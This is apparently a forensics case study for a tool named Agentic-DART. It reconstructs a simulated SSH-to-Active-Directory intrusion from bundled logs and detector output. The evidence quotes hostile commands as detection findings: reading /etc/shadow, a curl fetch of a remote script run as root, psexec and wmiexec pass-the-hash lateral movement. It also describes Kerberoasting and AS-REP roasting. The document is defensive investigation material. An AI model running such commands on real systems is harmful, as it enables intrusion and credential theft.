# Case Study 05 — Authentication, AD, and Lateral Movement

**Scenario class:** The "WHO" investigation — stolen cred + AD attack chain
**Functions used:** `analyze_windows_logons`, `detect_lateral_movement`,
  `analyze_kerberos_events`, `analyze_unix_auth`, `detect_privilege_escalation`

## Why this case matters

In a real intrusion, finding the malware is only half the job. The
questions that remain:

- **WHO** authenticated? (which user, from which host, using what method?)
- Did the attacker come via **console, RDP, SMB, or Kerberos** abuse?
- Did they **move laterally** to other hosts?
- Did they **escalate privileges** after foothold?

Case 01 (IP-KVM) showed local credential abuse. Case 04 showed phishing
entry. This case shows **AD-integrated attack chain** — the pattern
security teams see every day in enterprise environments.

## Attack reconstruction (bundled evidence)

```
14:05  Linux SSH brute force from 203.0.113.42
       └─ 10 failed attempts (admin/root/test/postgres + 2x analyst)
14:05:35  publickey accepted for analyst        ← stolen private key
14:07  sudo to root: cat /etc/shadow, curl | bash
───────────────────────────────────────
14:10  Windows SMB brute force from 203.0.113.42
       └─ 4 failed type-3 logons as analyst
14:11  Type-3 success (NTLM)                   ← cred from Linux host
14:22  Type-10 RDP from 203.0.113.42 to WKS-ANALYST
14:23:00  TGT request (normal AES)
14:24    3 × TGS requests with RC4 encryption   ← KERBEROASTING
           (MSSQL/SQL01, HTTP/exchange, LDAP/DC01)
14:23:30  Explicit-cred logon to DC01.corp.local (psexec)
14:24:15  Explicit-cred logon to SQL01.corp.local (wmiexec)
14:24:50  TGT for alice with NO preauth        ← AS-REP ROAST
───────────────────────────────────────
02:17 (next day) Type-10 RDP from 198.51.100.77   ← after-hours persistence
```

## Each MCP call on bundled evidence

### `analyze_windows_logons`

```
success=5  fail=4  explicit=2
by_logon_type:
  "3 (Network)": 1           ← SMB remote
  "2 (Interactive)": 1       ← console (legit 08:30)
  "10 (RemoteInteractive)": 2 ← RDP
  "5 (Service)": 1           ← service account (legit)

brute_force_survivors: [
  {user: "analyst", prior_failure_count: 4,
   success_ts: "14:11:30", source_ip: "203.0.113.42",
   severity: "high"}
]

after_hours_interactive_logons: [
  {user: "analyst", logon_type_name: "RemoteInteractive",
   ts: "2026-03-15 02:17:00", source_ip: "198.51.100.77"}
]

unique_remote_source_ips: 2
```

### `detect_lateral_movement`

```
remote_admin_hits: 2
  {tool: "psexec", pid: 5100, cmdline: "psexec \\\\DC01 -u Administrator cmd.exe"}
  {tool: "wmiexec", pid: 5200, cmdline: "python wmiexec.py -hashes :abcd ..."}

suspicious_pairs: 5
  analyst@203.0.113.42     → psexec  (Δ105s, high)
  Administrator@10.0.0.50 → psexec  (Δ15s, high)   ← explicit-cred logon
  svc_sql@10.0.0.50       → wmiexec (Δ15s, high)   ← stolen svc account

summary_by_tool: {"psexec": 1, "wmiexec": 1}
```

### `analyze_kerberos_events`

```
max_severity: high
stats: {kerberoasting_count: 3, asrep_roasting_count: 1}

kerberoasting_candidates:
  {user: "analyst", service: "MSSQLSvc/SQL01.corp.local", enc: "0x17" (RC4)}
  {user: "analyst", service: "HTTP/exchange.corp.local",  enc: "0x17" (RC4)}
  {user: "analyst", service: "LDAP/DC01.corp.local",      enc: "0x17" (RC4)}

asrep_roasting_candidates:
  {user: "alice", interpretation: "TGT with no pre-auth — AS-REP Roasting"}
```

**Why RC4 = Kerberoasting signal:** modern AD uses AES (`0x11`/`0x12`).
A TGS request with RC4 (`0x17`) is almost always an attacker forcing the
weak cipher to crack the service account password offline.

### `analyze_unix_auth`

```
accept=2  fail=6  invalid=4  sudo=4

brute_force_sources: [
  {source_ip: "203.0.113.42", failure_count: 10, severity: "high"}
]

brute_force_survivors: [
  {user: "analyst", source_ip: "203.0.113.42",
   ts: "2026-03-15T14:05:35", severity: "critical",
   interpretation: "successful SSH after brute force from same IP"}
]

dangerous_sudo_commands: [
  {user: "analyst", target: "root", command: "/bin/cat /etc/shadow"},
  {user: "analyst", target: "root", command: "/usr/bin/curl http://198.51.100.23/s.sh"},
  {user: "analyst", target: "root", command: "/bin/bash /tmp/s.sh"}
]
```

### `detect_privilege_escalation` (cross-platform)

```
transitions: 2   critical: 2

critical_transitions:
  analyst (203.0.113.42) → root in 85s  `/bin/cat /etc/shadow`
  analyst (203.0.113.42) → root in 100s `/usr/bin/curl http://198.51.100.23/s.sh`
```

## Complete narrative for the incident report

> On 2026-03-15, the attacker at `203.0.113.42` first compromised a Linux
> web server via SSH brute force against user `analyst` (10 attempts in 35
> seconds, publickey succeeded at 14:05:35 — suggesting a stolen private
> key). Within 95 seconds they read `/etc/shadow` and downloaded a
> secondary payload via `curl | bash`, transitioning to root.
>
> From the Linux foothold they pivoted to the Windows domain: 4 failed
> SMB logons (type 3) followed by success, then RDP (type 10) at 14:22
> to `WKS-ANALYST`. At 14:24 the compromised account performed a
> Kerberoasting campaign against three high-value services
> (`MSSQLSvc/SQL01`, `HTTP/exchange`, `LDAP/DC01`), requesting service
> tickets with RC4 encryption for offline cracking. The attacker also
> executed AS-REP Roasting against user `alice` (preauth disabled).
>
> Armed with recovered service-account credentials, they moved laterally
> to DC01 (psexec as Administrator) and SQL01 (wmiexec as `svc_sql`).
> A persistence RDP session connected at 02:17 the next morning from a
> second IP (`198.51.100.77`), indicating the attacker still holds
> working credentials.
>
> Findings F-050 through F-061 reference the audit entries. Evidence
> SHA-256 hashes verified pre/post analysis.

## What makes this important

Before this case study, Agentic-DART could tell you malware ran. It could not
answer: **"Did this come from a console user, a stolen SSH key, a
Kerberoast, or an RDP session from a suspicious IP?"** Now it can, across
Windows (AD), Linux (auth.log), and macOS.

This is the missing DFIR dimension the user explicitly flagged:
**"AD로 로그인 했거나, 로컬로 로그인 했거나, 리모트로 로그인해서 명령
실행한 것"** — now fully covered.
